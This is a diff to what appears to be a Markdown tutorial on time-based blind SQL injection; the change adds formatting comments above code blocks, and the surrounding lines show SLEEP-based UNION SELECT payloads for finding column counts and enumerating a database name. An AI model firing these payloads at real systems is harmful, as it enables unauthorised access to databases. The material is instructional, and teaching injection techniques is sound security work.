@@ -20,6 +20,7 @@ Time-based blind SQLi is used when there is no visible true/false difference in 
 
 ### 1. Find the column count
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT SLEEP(5);--
 admin123' UNION SELECT SLEEP(5),2;--
@@ -29,6 +30,7 @@ The payload that produces a delay has the correct `UNION SELECT` shape.
 
 ### 2. Enumerate the database name
 
+<!-- cmd: sql -->
 ```sql
 admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
 ```
